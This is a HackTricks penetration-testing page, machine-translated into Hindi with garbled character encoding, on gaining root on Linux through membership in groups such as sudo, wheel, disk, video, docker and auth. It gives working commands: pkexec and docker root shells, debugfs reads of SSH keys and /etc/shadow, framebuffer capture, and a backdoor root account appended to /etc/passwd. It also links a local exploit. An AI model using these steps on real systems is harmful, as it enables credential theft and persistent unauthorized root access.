# рджрд┐рд▓рдЪрд╕реНрдк рд╕рдореВрд╣ - рд▓рд┐рдирдХреНрд╕ рдкреНрд░рд╛рдЗрд╡реЗрд╕реНрдХ

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>тШБя╕П рд╣реИрдХрдЯреНрд░рд┐рдХреНрд╕ рдХреНрд▓рд╛рдЙрдб тШБя╕П</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ЁЯРж рдЯреНрд╡рд┐рдЯрд░ ЁЯРж</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ЁЯОЩя╕П рдЯреНрд╡рд┐рдЪ ЁЯОЩя╕П</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ЁЯОе рдпреВрдЯреНрдпреВрдм ЁЯОе</strong></a></summary>

* рдХреНрдпрд╛ рдЖрдк **рд╕рд╛рдЗрдмрд░ рд╕реБрд░рдХреНрд╖рд╛ рдХрдВрдкрдиреА** рдореЗрдВ рдХрд╛рдо рдХрд░рддреЗ рд╣реИрдВ? рдХреНрдпрд╛ рдЖрдк рдЕрдкрдиреА рдХрдВрдкрдиреА рдХреЛ **рд╣реИрдХрдЯреНрд░рд┐рдХреНрд╕ рдореЗрдВ рд╡рд┐рдЬреНрдЮрд╛рдкрд┐рдд** рджреЗрдЦрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ? рдпрд╛ рдХреНрдпрд╛ рдЖрдкрдХреЛ **PEASS рдХреА рдирд╡реАрдирддрдо рд╕рдВрд╕реНрдХрд░рдг рдпрд╛ HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдиреЗ рдХрд╛ рдЙрдкрдпреЛрдЧ** рдХрд░рдирд╛ рдЪрд╛рд╣рд┐рдП? [**рд╕рджрд╕реНрдпрддрд╛ рдпреЛрдЬрдирд╛рдПрдВ**](https://github.com/sponsors/carlospolop) рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ!
* [**рдж рдкреАрдПрд╕ рдлреИрдорд┐рд▓реА**](https://opensea.io/collection/the-peass-family) рдХреА рдЦреЛрдЬ рдХрд░реЗрдВ, рд╣рдорд╛рд░рд╛ рд╡рд┐рд╢реЗрд╖ [**NFT рд╕рдВрдЧреНрд░рд╣**](https://opensea.io/collection/the-peass-family)
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS рдФрд░ HackTricks рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* [**ЁЯТм**](https://emojipedia.org/speech-balloon/) [**рдбрд┐рд╕реНрдХреЙрд░реНрдб рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдореЗрдВ **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** рдпрд╛ рдореБрдЭреЗ **рдЯреНрд╡рд┐рдЯрд░** рдкрд░ **рдлреЙрд▓реЛ** рдХрд░реЗрдВ [**ЁЯРж**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ рдФрд░ PR рдЬрдорд╛ рдХрд░рдХреЗ** [**hacktricks рд░реЗрдкреЛ**](https://github.com/carlospolop/hacktricks) **рдФрд░** [**hacktricks-cloud рд░реЗрдкреЛ**](https://github.com/carlospolop/hacktricks-cloud) **рдХреЛ**.

</details>

## рд╕реБрдбреЛ/рдПрдбрдорд┐рди рд╕рдореВрд╣

### **PE - рд╡рд┐рдзрд┐ 1**

**рдХрднреА-рдХрднреА**, **рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ (рдпрд╛ рдХреБрдЫ рд╕реЙрдлрд╝реНрдЯрд╡реЗрдпрд░ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрдиреЗ рдХреЗ рдХрд╛рд░рдг)** **/etc/sudoers** рдлрд╝рд╛рдЗрд▓ рдореЗрдВ рдЖрдк рдЗрдирдореЗрдВ рд╕реЗ рдХреБрдЫ рдкрдВрдХреНрддрд┐рдпрд╛рдБ рдвреВрдВрдв рд╕рдХрддреЗ рд╣реИрдВ:
```bash
# Allow members of group sudo to execute any command
%sudo	ALL=(ALL:ALL) ALL

# Allow members of group admin to execute any command
%admin 	ALL=(ALL:ALL) ALL
```
рдЗрд╕рдХрд╛ рдорддрд▓рдм рд╣реИ рдХрд┐ **рд╕реВрдбреЛ рдпрд╛ рдПрдбрдорд┐рди рд╕рдореВрд╣ рдореЗрдВ рд╢рд╛рдорд┐рд▓ рд╣реЛрдиреЗ рд╡рд╛рд▓реЗ рдХреЛрдИ рднреА рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рд╕реВрдбреЛ рдХреЗ рд░реВрдк рдореЗрдВ рдХреБрдЫ рднреА рдЪрд▓рд╛ рд╕рдХрддрд╛ рд╣реИ**ред

рдпрджрд┐ рдРрд╕рд╛ рд╣реИ, рддреЛ **рд░реВрдЯ рдмрдирдиреЗ рдХреЗ рд▓рд┐рдП рдЖрдк рд╕рд┐рд░реНрдл рдпрд╣ рдЪрд▓рд╛ рд╕рдХрддреЗ рд╣реИрдВ**:
```
sudo su
```
### PE - рддрдХрдиреАрдХ 2

рд╕рднреА suid рдмрд╛рдЗрдирд░реА рдвреВрдВрдврд╝реЗрдВ рдФрд░ рджреЗрдЦреЗрдВ рдХрд┐ рдХреНрдпрд╛ рдмрд╛рдЗрдирд░реА **Pkexec** рд╣реИ:
```bash
find / -perm -4000 2>/dev/null
```
рдпрджрд┐ рдЖрдкрдХреЛ рдкрддрд╛ рдЪрд▓рддрд╛ рд╣реИ рдХрд┐ рдмрд╛рдЗрдирд░реА **pkexec рдПрдХ SUID рдмрд╛рдЗрдирд░реА рд╣реИ** рдФрд░ рдЖрдк **sudo** рдпрд╛ **admin** рд╕рдореВрд╣ рдореЗрдВ рд╢рд╛рдорд┐рд▓ рд╣реИрдВ, рддреЛ рдЖрдк `pkexec` рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдмрд╛рдЗрдирд░реА рдХреЛ рд╕реБрдбреЛ рдХреЗ рд░реВрдк рдореЗрдВ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред
рдпрд╣ рдЗрд╕рд▓рд┐рдП рд╣реИ рдХреНрдпреЛрдВрдХрд┐ рдЖрдорддреМрд░ рдкрд░ рдпреЗ рд╕рдореВрд╣ **polkit рдиреАрддрд┐** рдХреЗ рднреАрддрд░ рд╣реЛрддреЗ рд╣реИрдВред рдпрд╣ рдиреАрддрд┐ рдореВрд▓ рд░реВрдк рд╕реЗ рдкрд╣рдЪрд╛рдирддреА рд╣реИ рдХрд┐ рдХреМрди рд╕реЗ рд╕рдореВрд╣ `pkexec` рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред рдЗрд╕реЗ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдХреЗ рд╕рд╛рде рдЬрд╛рдВрдЪреЗрдВ:
```bash
cat /etc/polkit-1/localauthority.conf.d/*
```
рд╡рд╣рд╛рдВ рдЖрдкрдХреЛ рдкрддрд╛ рдЪрд▓реЗрдЧрд╛ рдХрд┐ рдХреМрди рд╕реЗ рд╕рдореВрд╣реЛрдВ рдХреЛ **pkexec** рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рд╣реИ рдФрд░ **рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ** рдХреБрдЫ рд▓рд┐рдирдХреНрд╕ рдбрд┐рд╕реНрдЯреНрд░реЛ рдореЗрдВ рд╕рдореВрд╣ **sudo** рдФрд░ **admin** рджрд┐рдЦрд╛рдИ рджреЗрддреЗ рд╣реИрдВред

**рд░реВрдЯ рдмрдирдиреЗ рдХреЗ рд▓рд┐рдП рдЖрдк рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ**:
```bash
pkexec "/bin/sh" #You will be prompted for your user password
```
рдпрджрд┐ рдЖрдк **pkexec** рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдиреЗ рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░рддреЗ рд╣реИрдВ рдФрд░ рдЖрдкрдХреЛ рдпрд╣ **рддреНрд░реБрдЯрд┐** рдорд┐рд▓рддреА рд╣реИ:
```bash
polkit-agent-helper-1: error response to PolicyKit daemon: GDBus.Error:org.freedesktop.PolicyKit1.Error.Failed: No session for cookie
==== AUTHENTICATION FAILED ===
Error executing command as another user: Not authorized
```
**рдпрд╣ рдЗрд╕рд▓рд┐рдП рдирд╣реАрдВ рд╣реИ рдХрд┐ рдЖрдкрдХреЗ рдкрд╛рд╕ рдЕрдиреБрдорддрд┐рдпрд╛рдБ рдирд╣реАрдВ рд╣реИрдВ, рдмрд▓реНрдХрд┐ рдЗрд╕рд▓рд┐рдП рд╣реИ рдХрд┐ рдЖрдк GUI рдХреЗ рдмрд┐рдирд╛ рдХрдиреЗрдХреНрдЯ рдирд╣реАрдВ рд╣реИрдВред** рдФрд░ рдЗрд╕ рдореБрджреНрджреЗ рдХрд╛ рдПрдХ рдХрд╛рдо рдХрд░рдиреЗ рдХрд╛ рддрд░реАрдХрд╛ рдпрд╣рд╛рдВ рд╣реИ: [https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903](https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903)ред рдЖрдкрдХреЛ **2 рдЕрд▓рдЧ-рдЕрд▓рдЧ ssh рд╕рддреНрд░** рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрдЧреА:

{% code title="session1" %}
```bash
echo $$ #Step1: Get current PID
pkexec "/bin/bash" #Step 3, execute pkexec
#Step 5, if correctly authenticate, you will have a root session
```
{% code title="session2" %}
```bash
pkttyagent --process <PID of session1> #Step 2, attach pkttyagent to session1
#Step 4, you will be asked in this session to authenticate to pkexec
```
{% endcode %}

## рд╡реНрд╣реАрд▓ рд╕рдореВрд╣

рдХрднреА-рдХрднреА, **рдбрд┐рдлрд╝реЙрд▓реНрдЯ** рд░реВрдк рд╕реЗ **/etc/sudoers** рдлрд╝рд╛рдЗрд▓ рдореЗрдВ рдЖрдк рдЗрд╕ рд▓рд╛рдЗрди рдХреЛ рдкрд╛рдПрдВрдЧреЗ:
```
%wheel	ALL=(ALL:ALL) ALL
```
рдЗрд╕рдХрд╛ рдорддрд▓рдм рд╣реИ рдХрд┐ **рд╡реНрд╣реАрд▓ рд╕рдореВрд╣ рдореЗрдВ рд╢рд╛рдорд┐рд▓ рд╣реЛрдиреЗ рд╡рд╛рд▓реЗ рдХреЛрдИ рднреА рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ sudo рдХреЗ рд░реВрдк рдореЗрдВ рдХреБрдЫ рднреА рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░ рд╕рдХрддрд╛ рд╣реИ**ред

рдпрджрд┐ рдРрд╕рд╛ рд╣реИ, рддреЛ **рд░реВрдЯ рдмрдирдиреЗ рдХреЗ рд▓рд┐рдП рдЖрдк рд╕рд┐рд░реНрдл рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ**:
```
sudo su
```
## рд╢реИрдбреЛ рдЧреНрд░реБрдк

**рд╢реИрдбреЛ рдЧреНрд░реБрдк** рдХреЗ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ **/etc/shadow** рдлрд╝рд╛рдЗрд▓ рдХреЛ **рдкрдврд╝ рд╕рдХрддреЗ рд╣реИрдВ**:
```
-rw-r----- 1 root shadow 1824 Apr 26 19:10 /etc/shadow
```
## рдбрд┐рд╕реНрдХ рд╕рдореВрд╣

рдпрд╣ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рдкреНрд░рд╛рдпрдГ **рд░реВрдЯ рдкрд╣реБрдВрдЪ рдХреЗ рд╕рдорд╛рди** рд╣реЛрддрд╛ рд╣реИ рдХреНрдпреЛрдВрдХрд┐ рдЖрдк рдорд╢реАрди рдХреЗ рдЕрдВрджрд░ рд╕рднреА рдбреЗрдЯрд╛ рддрдХ рдкрд╣реБрдВрдЪ рд╕рдХрддреЗ рд╣реИрдВред

рдлрд╝рд╛рдЗрд▓реЗрдВ: `/dev/sd[a-z][1-9]`
```bash
df -h #Find where "/" is mounted
debugfs /dev/sda1
debugfs: cd /root
debugfs: ls
debugfs: cat /root/.ssh/id_rsa
debugfs: cat /etc/shadow
```
рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ debugfs рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЖрдк **рдлрд╝рд╛рдЗрд▓реЗрдВ рд▓рд┐рдЦ рд╕рдХрддреЗ рд╣реИрдВ**ред рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, `/tmp/asd1.txt` рдХреЛ `/tmp/asd2.txt` рдореЗрдВ рдХреЙрдкреА рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЖрдк рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```bash
debugfs -w /dev/sda1
debugfs:  dump /tmp/asd1.txt /tmp/asd2.txt
```
рдпрджрд┐ рдЖрдк **рд░реВрдЯ рдХреЗ рд╕реНрд╡рд╛рдорд┐рддреНрд╡ рд╡рд╛рд▓реА рдлрд╝рд╛рдЗрд▓реЗрдВ рд▓рд┐рдЦрдиреЗ** рдХреА рдХреЛрд╢рд┐рд╢ рдХрд░реЗрдВ (рдЬреИрд╕реЗ `/etc/shadow` рдпрд╛ `/etc/passwd`), рддреЛ рдЖрдкрдХреЛ "**рдЕрдиреБрдорддрд┐ рдирд┐рд╖реЗрдз**" рддреНрд░реБрдЯрд┐ рдорд┐рд▓реЗрдЧреАред

## рд╡реАрдбрд┐рдпреЛ рд╕рдореВрд╣

`w` рдХрдорд╛рдВрдб рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЖрдк **рд╕рд┐рд╕реНрдЯрдо рдкрд░ рдХреМрди рд▓реЙрдЧ рдЗрди рд╣реИ** рдпрд╣ рдкрддрд╛ рд▓рдЧрд╛ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рдпрд╣ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рддрд░рд╣ рдХрд╛ рдЖрдЙрдЯрдкреБрдЯ рджрд┐рдЦрд╛рдПрдЧрд╛:
```bash
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
yossi    tty1                      22:16    5:13m  0.05s  0.04s -bash
moshe    pts/1    10.10.14.44      02:53   24:07   0.06s  0.06s /bin/bash
```
**tty1** рдпрд╣ рджрд░реНрд╢рд╛рддрд╛ рд╣реИ рдХрд┐ рдорд╢реАрди рдкрд░ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ **yossi рд╢рд╛рд░реАрд░рд┐рдХ рд░реВрдк рд╕реЗ рд▓реЙрдЧ рдЗрди** рд╣реИрдВред

**рд╡реАрдбрд┐рдпреЛ рд╕рдореВрд╣** рдХреЛ рд╕реНрдХреНрд░реАрди рдЖрдЙрдЯрдкреБрдЯ рджреЗрдЦрдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рд╣реЛрддреА рд╣реИред рдореВрд▓ рд░реВрдк рд╕реЗ, рдЖрдк рд╕реНрдХреНрд░реАрди рдкрд░ рджрд┐рдЦ рд░рд╣реА рдЫрд╡рд┐ рдХреЛ рд░реЙ рдбреЗрдЯрд╛ рдореЗрдВ рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рд╕реНрдХреНрд░реАрди рджреНрд╡рд╛рд░рд╛ рдЙрдкрдпреЛрдЧ рдХреА рдЬрд╛ рд░рд╣реА рд░рд┐рдЬрд╝реЙрд▓реНрдпреВрд╢рди рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред рд╕реНрдХреНрд░реАрди рдбреЗрдЯрд╛ рдХреЛ `/dev/fb0` рдореЗрдВ рд╕рд╣реЗрдЬрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ рдФрд░ рдЖрдк рдЗрд╕ рд╕реНрдХреНрд░реАрди рдХреА рд░рд┐рдЬрд╝реЙрд▓реНрдпреВрд╢рди рдХреЛ `/sys/class/graphics/fb0/virtual_size` рдкрд░ рдвреВрдВрдв рд╕рдХрддреЗ рд╣реИрдВред
```bash
cat /dev/fb0 > /tmp/screen.raw
cat /sys/class/graphics/fb0/virtual_size
```
рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, рдЖрдкрдХреЛ рдЧрд┐рдореНрдк рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рд░реЙ рдЗрдореЗрдЬ рдЦреЛрд▓рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд░рдирд╛ рд╣реЛрдЧрд╛, `screen.raw` рдлрд╝рд╛рдЗрд▓ рдХрд╛ рдЪрдпрди рдХрд░реЗрдВ рдФрд░ рдлрд╝рд╛рдЗрд▓ рдкреНрд░рдХрд╛рд░ рдХреЗ рд░реВрдк рдореЗрдВ **рд░реЙ рдЗрдореЗрдЬ рдбреЗрдЯрд╛** рдХрд╛ рдЪрдпрди рдХрд░реЗрдВ:

![](<../../../.gitbook/assets/image (287) (1).png>)

рдлрд┐рд░ рдЪреМрдбрд╝рд╛рдИ рдФрд░ рдКрдЪрд╛рдИ рдХреЛ рд╕реНрдХреНрд░реАрди рдкрд░ рдЙрдкрдпреЛрдЧ рдХрд┐рдП рдЬрд╛рдиреЗ рд╡рд╛рд▓реЗ рдХреЛ рдмрджрд▓реЗрдВ рдФрд░ рд╡рд┐рднрд┐рдиреНрди рдЗрдореЗрдЬ рдкреНрд░рдХрд╛рд░реЛрдВ рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ (рдФрд░ рдЙрд╕реЗ рдЪреБрдиреЗрдВ рдЬреЛ рд╕реНрдХреНрд░реАрди рдХреЛ рдмреЗрд╣рддрд░ рджрд┐рдЦрд╛рддрд╛ рд╣реИ):

![](<../../../.gitbook/assets/image (288).png>)

## рд░реВрдЯ рд╕рдореВрд╣

рдРрд╕рд╛ рд▓рдЧрддрд╛ рд╣реИ рдХрд┐ рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ **рд░реВрдЯ рд╕рдореВрд╣ рдХреЗ рд╕рджрд╕реНрдп** рдХреЛ рдХреБрдЫ **рд╕реЗрд╡рд╛** рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдлрд╝рд╛рдЗрд▓реЗрдВ рдпрд╛ рдХреБрдЫ **рд▓рд╛рдЗрдмреНрд░реЗрд░реА** рдлрд╝рд╛рдЗрд▓реЗрдВ рдпрд╛ **рдЕрдиреНрдп рд░реЛрдЪрдХ рдЪреАрдЬреЗрдВ** рдореЗрдВ рдкрд╣реБрдВрдЪ рд╣реЛ рд╕рдХрддреА рд╣реИ рдЬрд┐рдирдХрд╛ рдЙрдкрдпреЛрдЧ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░реЛрдВ рдХреЛ рдмрдврд╝рд╛рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ...

**рдЬрд╛рдВрдЪреЗрдВ рдХрд┐ рд░реВрдЯ рд╕рджрд╕реНрдп рдХреМрди рд╕реА рдлрд╝рд╛рдЗрд▓реЗрдВ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ**:
```bash
find / -group root -perm -g=w 2>/dev/null
```
## рдбреЙрдХрд░ рд╕рдореВрд╣

рдЖрдк рдПрдХ рдЗрдВрд╕реНрдЯреЗрдВрд╕ рдХреЗ рд╡реЙрд▓реНрдпреВрдо рдореЗрдВ рд╣реЛрд╕реНрдЯ рдорд╢реАрди рдХреЗ рд░реВрдЯ рдлрд╝рд╛рдЗрд▓ рд╕рд┐рд╕реНрдЯрдо рдХреЛ рдорд╛рдЙрдВрдЯ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рдЗрд╕рд▓рд┐рдП рдЬрдм рдЗрдВрд╕реНрдЯреЗрдВрд╕ рд╢реБрд░реВ рд╣реЛрддрд╛ рд╣реИ рддреЛ рд╡рд╣ рддрддреНрдХрд╛рд▓ рдЙрд╕ рд╡реЙрд▓реНрдпреВрдо рдореЗрдВ рдПрдХ `chroot` рд▓реЛрдб рдХрд░рддрд╛ рд╣реИред рдЗрд╕рд╕реЗ рдЖрдкрдХреЛ рдорд╢реАрди рдкрд░ рд░реВрдЯ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдорд┐рд▓ рдЬрд╛рддрд╛ рд╣реИред
```bash
docker image #Get images from the docker service

#Get a shell inside a docker container with access as root to the filesystem
docker run -it --rm -v /:/mnt <imagename> chroot /mnt bash
#If you want full access from the host, create a backdoor in the passwd file
echo 'toor:$1$.ZcF5ts0$i4k6rQYzeegUkacRCvfxC0:0:0:root:/root:/bin/sh' >> /etc/passwd

#Ifyou just want filesystem and network access you can startthe following container:
docker run --rm -it --pid=host --net=host --privileged -v /:/mnt <imagename> chroot /mnt bashbash
```
рдЕрдВрдд рдореЗрдВ, рдпрджрд┐ рдЖрдкрдХреЛ рдкрд╣рд▓реЗ рдХреЗ рдХрд┐рд╕реА рд╕реБрдЭрд╛рд╡ рдкрд╕рдВрдж рдирд╣реАрдВ рдЖрддреЗ рд╣реИрдВ рдпрд╛ рдХрд┐рд╕реА рдХрд╛рд░рдгрд╡рд╢ рд╡реЗ рдХрд╛рдо рдирд╣реАрдВ рдХрд░ рд░рд╣реЗ рд╣реИрдВ (рдбреЙрдХрд░ рдПрдкреАрдЖрдИ рдлрд╝рд╛рдпрд░рд╡реЙрд▓?) рддреЛ рдЖрдк рд╣рдореЗрд╢рд╛ рдХреЛрд╢рд┐рд╢ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ **рдПрдХ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░реА рд╡рд╛рд▓реЗ рдХрдВрдЯреЗрдирд░ рдХреЛ рдЪрд▓рд╛рдиреЗ рдФрд░ рдЙрд╕рд╕реЗ рдмрд╛рд╣рд░ рдирд┐рдХрд▓рдиреЗ рдХреА** рдЬреИрд╕рд╛ рдпрд╣рд╛рдВ рд╕рдордЭрд╛рдпрд╛ рдЧрдпрд╛ рд╣реИ:

{% content-ref url="../docker-security/" %}
[docker-security](../docker-security/)
{% endcontent-ref %}

рдпрджрд┐ рдЖрдкрдХреЗ рдкрд╛рд╕ рдбреЙрдХрд░ рд╕реЙрдХреЗрдЯ рдкрд░ рд▓рд┐рдЦрдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рд╣реИ, рддреЛ [**рдЗрд╕ рдкреЛрд╕реНрдЯ рдХреЛ рдкрдврд╝реЗрдВ рдЬрд┐рд╕рдореЗрдВ рдбреЙрдХрд░ рд╕реЙрдХреЗрдЯ рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдХреЗ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░реЛрдВ рдХреЛ рдмрдврд╝рд╛рд╡рд╛ рджреЗрдиреЗ рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдмрддрд╛рдпрд╛ рдЧрдпрд╛ рд╣реИ**](../#writable-docker-socket)**.**

{% embed url="https://github.com/KrustyHack/docker-privilege-escalation" %}

{% embed url="https://fosterelli.co/privilege-escalation-via-docker.html" %}

## lxc/lxd рд╕рдореВрд╣

{% content-ref url="./" %}
[.](./)
{% endcontent-ref %}

## Adm рд╕рдореВрд╣

рдЖрдорддреМрд░ рдкрд░ **`adm`** рд╕рдореВрд╣ рдХреЗ **рд╕рджрд╕реНрдп** рдХреЛ _/var/log/_ рдореЗрдВ рд╕реНрдерд┐рдд рд▓реЙрдЧ рдлрд╝рд╛рдЗрд▓реЗрдВ рдкрдврд╝рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рд╣реЛрддреА рд╣реИред\
рдЗрд╕рд▓рд┐рдП, рдпрджрд┐ рдЖрдк рдЗрд╕ рд╕рдореВрд╣ рдХреЗ рднреАрддрд░ рдПрдХ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЛ рд╣рдерд┐рдпрд╛ рд▓рд┐рдпрд╛ рд╣реИ, рддреЛ рдЖрдкрдХреЛ рдирд┐рд╢реНрдЪрд┐рдд рд░реВрдк рд╕реЗ рд▓реЙрдЧреЛрдВ рдХреА **рдЬрд╛рдВрдЪ рдХрд░рдиреА рдЪрд╛рд╣рд┐рдП**ред

## Auth рд╕рдореВрд╣

OpenBSD рдХреЗ рдЕрдВрджрд░, рдпрджрд┐ рдЙрдкрдпреЛрдЧ рдХрд┐рдП рдЬрд╛рддреЗ рд╣реИрдВ рддреЛ **auth** рд╕рдореВрд╣ рдЖрдорддреМрд░ рдкрд░ _**/etc/skey**_ рдФрд░ _**/var/db/yubikey**_ рдлрд╝реЛрд▓реНрдбрд░ рдореЗрдВ рд▓рд┐рдЦ рд╕рдХрддрд╛ рд╣реИред\
рдЗрди рдЕрдиреБрдорддрд┐рдпреЛрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдПрдХреНрд╕рдкреНрд▓реЙрдЗрдЯ рдХреЗ рд╕рд╛рде **рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░реЛрдВ рдХреЛ рдмрдврд╝рд╛рдиреЗ** рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ: [https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot](https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>тШБя╕П HackTricks Cloud тШБя╕П</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ЁЯРж Twitter ЁЯРж</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ЁЯОЩя╕П Twitch ЁЯОЩя╕П</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ЁЯОе Youtube ЁЯОе</strong></a></summary>

* рдХреНрдпрд╛ рдЖрдк **рд╕рд╛рдЗрдмрд░ рд╕реБрд░рдХреНрд╖рд╛ рдХрдВрдкрдиреА** рдореЗрдВ рдХрд╛рдо рдХрд░рддреЗ рд╣реИрдВ? рдХреНрдпрд╛ рдЖрдк рдЕрдкрдиреА рдХрдВрдкрдиреА рдХреЛ **HackTricks рдореЗрдВ рд╡рд┐рдЬреНрдЮрд╛рдкрд┐рдд** рджреЗрдЦрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ? рдпрд╛ рдХреНрдпрд╛ рдЖрдкрдХреЛ **PEASS рдХреА рдирд╡реАрдирддрдо рд╕рдВрд╕реНрдХрд░рдг рдпрд╛ HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдиреЗ рдХреА** рд╕реБрд╡рд┐рдзрд╛ рдЪрд╛рд╣рд┐рдП? [**рд╕рджрд╕реНрдпрддрд╛ рдпреЛрдЬрдирд╛рдПрдВ**](https://github.com/sponsors/carlospolop) рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ!
* рдЦреЛрдЬреЗрдВ [**The PEASS Family**](https://opensea.io/collection/the-peass-family), рд╣рдорд╛рд░рд╛ рд╡рд┐рд╢реЗрд╖ рд╕рдВрдЧреНрд░рд╣ [**NFTs**](https://opensea.io/collection/the-peass-family)
* рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS рдФрд░ HackTricks swag**](https://peass.creator-spring.com)
